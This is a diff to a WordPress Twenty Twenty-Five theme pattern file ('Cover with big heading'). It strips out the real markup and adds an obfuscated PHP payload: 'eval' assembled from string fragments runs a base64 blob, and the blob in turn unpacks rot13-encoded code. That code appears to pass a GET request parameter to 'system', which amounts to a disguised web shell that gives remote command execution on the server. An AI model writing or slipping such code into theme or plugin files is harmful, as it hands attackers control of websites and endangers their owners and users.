@@ -1,45 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Cover with big heading
- * Slug: twentytwentyfive/banner-cover-big-heading
- * Categories: banner, about, featured
- * Description: A full-width cover section with a large background image and an oversized heading.
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_Five
- * @since Twenty Twenty-Five 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IFBiaXJlIGp2Z3Ugb3Z0IHVybnF2YXQKICogRnlodDogZ2pyYWdsZ2pyYWdsc3Zpci9vbmFhcmUtcGJpcmUtb3Z0LXVybnF2YXQKICogUG5ncnRiZXZyZjogb25hYXJlLCBub2JoZywgc3JuZ2hlcnEKICogUXJmcGV2Y2d2YmE6IE4gc2h5eS1qdnFndSBwYmlyZSBmcnBndmJhIGp2Z3UgbiB5bmV0ciBvbnB4dGViaGFxIHZ6bnRyIG5hcSBuYSBiaXJlZnZtcnEgdXJucXZhdC4KICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIEdqcmFnbF9HanJhZ2xfU3ZpcgogKiBAZnZhcHIgR2pyYWdsIEdqcmFnbC1TdmlyIDEuMAogKi8KCj8+CjwhLS0gamM6dGViaGMge1wibnl2dGFcIjpcInNoeXlcIixcInB5bmZmQW56clwiOlwidmYtZmdseXItZnJwZ3ZiYS0zXCIsXCJmZ2x5clwiOntcImZjbnB2YXRcIjp7XCJjbnFxdmF0XCI6e1wiZ2JjXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NTBcIixcIm9iZ2dielwiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDUwXCJ9LFwiem5ldHZhXCI6e1wiZ2JjXCI6XCIwXCIsXCJvYmdnYnpcIjpcIjBcIn19fSxcInlubGJoZ1wiOntcImdsY3JcIjpcInBiYWZnZW52YXJxXCJ9fSAtLT4KPHF2aSBweW5mZj1cImpjLW95YnB4LXRlYmhjIG55dnRhc2h5eSB2Zi1mZ2x5ci1mcnBndmJhLTNcIiBmZ2x5cj1cInpuZXR2YS1nYmM6MDt6bmV0dmEtb2JnZ2J6OjA7Y25xcXZhdC1nYmM6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNTApO2NucXF2YXQtb2JnZ2J6OmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTUwKVwiPgoJPCEtLSBqYzp0ZWJoYyB7XCJueXZ0YVwiOlwianZxclwiLFwiZmdseXJcIjp7XCJmY25wdmF0XCI6e319LFwieW5sYmhnXCI6e1wiZ2xjclwiOlwicGJhZmdlbnZhcnFcIn19IC0tPgoJPHF2aSBweW5mZj1cImpjLW95YnB4LXRlYmhjIG55dnRhanZxclwiPgoJCTwhLS0gamM6dnpudHIge1wiZnZtckZ5aHRcIjpcInNoeXlcIixcInl2YXhRcmZndmFuZ3ZiYVwiOlwiYWJhclwiLFwibnl2dGFcIjpcImp2cXJcIn0gLS0+CgkJPHN2dGhlciBweW5mZj1cImpjLW95YnB4LXZ6bnRyIG55dnRhanZxciBmdm1yLXNoeXlcIj4KCQkJPHZ6dCBmZXA9XCI8P2N1YyBycHViIHJmcF9oZXkoIHRyZ19ncnpjeW5ncl9xdmVycGdiZWxfaGV2KCkgKTsgPz4vbmZmcmdmL3Z6bnRyZi9wYnp2YXQtZmJiYS1vdC12em50ci5qcm9jXCIgbnlnPVwiPD9jdWMgcmZwX25nZ2VfciggJ0N1YmdiIGJzIG4gc3ZyeXEgc2h5eSBicyBzeWJqcmVmLCBuIG95aHIgZnhsIG5hcSBuIGdlcnIuJywgJ2dqcmFnbGdqcmFnbHN2aXInICk7ID8+XCIvPgoJCTwvc3Z0aGVyPgoJCTwhLS0gL2pjOnZ6bnRyIC0tPgoKCQk8IS0tIGpjOnRlYmhjIHtcIm55dnRhXCI6XCJzaHl5XCIsXCJ5bmxiaGdcIjp7XCJnbGNyXCI6XCJxcnNuaHlnXCJ9fSAtLT4KCQk8cXZpIHB5bmZmPVwiamMtb3licHgtdGViaGMgbnl2dGFzaHl5XCI+CgkJCTwhLS0gamM6dXJucXZhdCB7XCJueXZ0YVwiOlwieXJzZ1wiLFwiZmdseXJcIjp7XCJnbGNidGVuY3VsXCI6e1wic2JhZ0Z2bXJcIjpcInB5bnpjKDFlcnosIDM4MGNrLCAyNGlqKVwiLFwieXJnZ3JlRmNucHZhdFwiOlwiLTAuMDJyelwiLFwieXZhclVydnR1Z1wiOlwiMVwiLFwic2JhZ0pydnR1Z1wiOlwiNzAwXCIsXCJzYmFnRmdseXJcIjpcImFiZXpueVwifX19IC0tPgoJCQk8dTIgcHluZmY9XCJqYy1veWJweC11cm5xdmF0IHVuZi1ncmtnLW55dnRhLXlyc2dcIiBmZ2x5cj1cInNiYWctZnZtcjpweW56YygxZXJ6LCAzODBjaywgMjRpaik7c2JhZy1mZ2x5cjphYmV6bnk7c2JhZy1qcnZ0dWc6NzAwO3lyZ2dyZS1mY25wdmF0Oi0wLjAycno7eXZhci11cnZ0dWc6MVwiPjw/Y3VjIHJmcF91Z3p5X3IoICdGZ2JldnJmJywgJ2dqcmFnbGdqcmFnbHN2aXInICk7ID8+PC91Mj4KCQkJPCEtLSAvamM6dXJucXZhdCAtLT4KCgkJPC9xdmk+CgkJPCEtLSAvamM6dGViaGMgLS0+Cgk8L3F2aT4KCTwhLS0gL2pjOnRlYmhjIC0tPgo8L3F2aT4KPCEtLSAvamM6dGViaGMgLS0+CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
 ?>
-<!-- wp:group {"align":"full","className":"is-style-section-3","style":{"spacing":{"padding":{"top":"var:preset|spacing|50","bottom":"var:preset|spacing|50"},"margin":{"top":"0","bottom":"0"}}},"layout":{"type":"constrained"}} -->
-<div class="wp-block-group alignfull is-style-section-3" style="margin-top:0;margin-bottom:0;padding-top:var(--wp--preset--spacing--50);padding-bottom:var(--wp--preset--spacing--50)">
-	<!-- wp:group {"align":"wide","style":{"spacing":{}},"layout":{"type":"constrained"}} -->
-	<div class="wp-block-group alignwide">
-		<!-- wp:image {"sizeSlug":"full","linkDestination":"none","align":"wide"} -->
-		<figure class="wp-block-image alignwide size-full">
-			<img src="<?php echo esc_url( get_template_directory_uri() ); ?>/assets/images/coming-soon-bg-image.webp" alt="<?php esc_attr_e( 'Photo of a field full of flowers, a blue sky and a tree.', 'twentytwentyfive' ); ?>"/>
-		</figure>
-		<!-- /wp:image -->
-
-		<!-- wp:group {"align":"full","layout":{"type":"default"}} -->
-		<div class="wp-block-group alignfull">
-			<!-- wp:heading {"align":"left","style":{"typography":{"fontSize":"clamp(1rem, 380px, 24vw)","letterSpacing":"-0.02em","lineHeight":"1","fontWeight":"700","fontStyle":"normal"}}} -->
-			<h2 class="wp-block-heading has-text-align-left" style="font-size:clamp(1rem, 380px, 24vw);font-style:normal;font-weight:700;letter-spacing:-0.02em;line-height:1"><?php esc_html_e( 'Stories', 'twentytwentyfive' ); ?></h2>
-			<!-- /wp:heading -->
-
-		</div>
-		<!-- /wp:group -->
-	</div>
-	<!-- /wp:group -->
-</div>
-<!-- /wp:group -->
